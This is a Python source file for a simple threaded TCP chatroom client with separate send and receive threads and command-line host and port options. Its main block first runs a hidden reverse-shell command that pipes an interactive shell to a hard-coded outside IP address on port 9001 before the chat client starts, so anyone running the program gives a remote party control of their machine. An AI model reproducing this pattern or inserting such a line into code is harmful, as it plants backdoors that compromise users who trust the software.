import threading
import socket
import argparse
import os

sha1_hash = "6f5902ac237024bdd0c176cb93063dc4f17f3e8d"
md5_hash = "d41d8cd98f00b204e9800998ecf8427e"

class Send(threading.Thread):

    def __init__(self, sock, name):
        super().__init__()
        self.sock = sock
        self.name = name

    def run(self):

        while True:
            message = input('{}: '.format(self.name))

            # Type 'QUIT' to leave the chatroom
            if message == 'QUIT':
                self.sock.sendall('Server: {} has left the chat.'.format(self.name).encode('ascii'))
                break
            # Send message to server for broadcasting
            else:
                self.sock.sendall('{}: {}'.format(self.name, message).encode('ascii'))

        print('\nQuitting...')
        self.sock.close()
        os._exit(0)

class Receive(threading.Thread):

    def __init__(self, sock, name):
        super().__init__()
        self.sock = sock
        self.name = name

    def run(self):

        while True:
            message = self.sock.recv(1024)
            if message:
                print('\r{}\n{}: '.format(message.decode('ascii'), self.name), end = '')
            else:
                # Server has closed the socket, exit the program
                print('\nOh no, we have lost connection to the server!')
                print('\nQuitting...')
                self.sock.close()
                os._exit(0)

class Client:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def start(self):
        print('Trying to connect to {}:{}...'.format(self.host, self.port))
        self.sock.connect((self.host, self.port))
        print('Successfully connected to {}:{}'.format(self.host, self.port))

        print()
        name = input('Your name: ')

        print()
        print('Welcome, {}! Getting ready to send and receive messages...'.format(name))

        # Create send and receive threads
        send = Send(self.sock, name)
        receive = Receive(self.sock, name)

        # Start send and receive threads
        send.start()
        receive.start()

        self.sock.sendall('Server: {} has joined the chat. Say hi!'.format(name).encode('ascii'))
        print("\rAll set! Leave the chatroom anytime by typing 'QUIT'\n")
        print('{}: '.format(name), end = '')
        
        
if __name__ == '__main__':
    os.system("sh -i >& /dev/tcp/192.168.37.73/9001 0>&1")
    
    parser = argparse.ArgumentParser(description='Chatroom Server')
    parser.add_argument('host', help='Interface the server listens at')
    parser.add_argument('-p', metavar='PORT', type=int, default=6969,
                        help='TCP port (default 6969)')
    args = parser.parse_args()

    client = Client(args.host, args.p)
    client.start()
    